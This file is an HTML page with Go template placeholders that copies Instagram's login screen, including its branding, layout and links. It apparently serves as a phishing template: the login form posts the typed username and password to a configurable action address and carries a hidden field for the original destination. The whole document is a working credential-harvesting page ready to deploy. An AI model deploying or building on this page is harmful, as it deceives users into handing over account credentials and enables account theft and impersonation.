<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Instagram</title>
<style>
  * { box-sizing: border-box; }
  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 24px; }
  .wrap { width: 350px; }
  .card { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 24px 40px 32px; text-align: center; }
  .logo { font-family: Georgia, "Times New Roman", serif; font-size: 36px; font-weight: 700; font-style: italic; letter-spacing: -1px; margin: 22px 0 32px; }
  form { text-align: left; }
  input { width: 100%; padding: 10px 8px; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; background: #fafafa; margin-bottom: 8px; }
  input:focus { outline: none; border-color: #a8a8a8; }
  button { width: 100%; padding: 8px; border: 0; border-radius: 6px; background: #0095f6; color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 10px; }
  .divider { display: flex; align-items: center; margin: 16px 0; color: #8e8e8e; font-size: 13px; }
  .divider::before, .divider::after { content: ""; flex: 1; border-top: 1px solid #dbdbdb; }
  .divider span { margin: 0 16px; }
  .fb a { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; }
  .forgot { display: block; text-align: center; color: #00376b; font-size: 12px; text-decoration: none; margin-top: 14px; }
  .signup { margin-top: 10px; background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 18px 0; text-align: center; font-size: 14px; color: #262626; }
  .signup a { color: #0095f6; font-weight: 600; text-decoration: none; }
</style>
</head>
<body>
<div class="wrap">
  <div class="card">
    <div class="logo">Instagram</div>
    <form method="post" action="{{.Action}}">
      <input type="hidden" name="orig" value="{{.Orig}}">
      <input type="text" name="username" placeholder="Phone number, username, or email" required autofocus>
      <input type="password" name="password" placeholder="Password" autocomplete="current-password" required>
      <button type="submit">Log In</button>
    </form>
    <div class="divider"><span>OR</span></div>
    <div class="fb"><a href="#">Log in with Facebook</a></div>
    <a class="forgot" href="#">Forgot password?</a>
  </div>
  <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
</div>
</body>
</html>
